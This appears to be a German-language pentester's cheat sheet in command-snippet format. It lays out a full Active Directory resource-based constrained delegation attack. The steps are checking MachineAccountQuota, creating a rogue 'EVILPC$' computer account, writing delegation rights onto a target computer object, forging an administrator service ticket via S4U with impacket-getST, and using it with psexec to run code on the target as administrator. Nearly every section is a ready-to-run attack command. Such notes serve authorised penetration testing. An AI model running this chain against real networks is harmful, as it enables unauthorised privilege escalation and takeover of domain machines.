# WEG

#plateform/linux #target/remote #cat/RBCD

% boris, rbcd, maq, machineaccountquota, nxc, ldap, precheck
## [RBCD-a] MachineAccountQuota pruefen (kann ich ein Computerkonto anlegen?)
MAQ > 0 -> ich kann selbst ein Computerkonto anlegen und als Delegations-Identitaet nutzen.
```
nxc ldap <dc_ip> -u <user> -p '<password>' -d <domain> -M maq
```

% boris, rbcd, addcomputer, impacket, computer, machineaccount, evilpc
## [RBCD-b] Computerkonto anlegen (kontrollierte Identitaet; MAQ>0)
Merke Name+Pass: die brauchst du bei getST. dc-ip = IP.
```
impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'Passw0rd1' -dc-ip <dc_ip> '<domain>/<user>:<password>'
```

% boris, rbcd, impacket, delegate, msds, allowedtoactonbehalf, write, set
## [RBCD-c] RBCD setzen: Ziel darf von EVILPC$ impersoniert werden
Voraussetzung: GenericWrite/GenericAll auf das Ziel-Computerobjekt (oder via relay-Weg RELAY-e). delegate-to = ziel sAM (SRV01$).
```
impacket-rbcd -delegate-from 'EVILPC$' -delegate-to '<target_sam>$' -action write -dc-ip <dc_ip> '<domain>/<user>:<password>'
```

% boris, rbcd, getst, impacket, s4u, s4u2self, s4u2proxy, impersonate, ticket, lateral
## [RBCD-d] getST - Ticket als Administrator holen (S4U2Self+Proxy)
Kerberos -> domain=FQDN + SPN mit FQDN. Ergebnis: administrator.ccache. Konto+Pass aus RBCD-b.
```
impacket-getST -spn 'cifs/<target_fqdn>' -impersonate administrator -dc-ip <dc_ip> '<domain>/EVILPC$:Passw0rd1'
```

% boris, rbcd, kcache, krb5ccname, psexec, nxc, usekcache, pth, ticket, lateral, exec
## [RBCD-e] Ticket nutzen - als Administrator aufs Ziel (kcache)
Erst export, dann Zugriff. nxc-Alternative: nxc smb <target_fqdn> --use-kcache -x whoami
```
export KRB5CCNAME=administrator.ccache; impacket-psexec -k -no-pass '<domain>/administrator@<target_fqdn>'
```
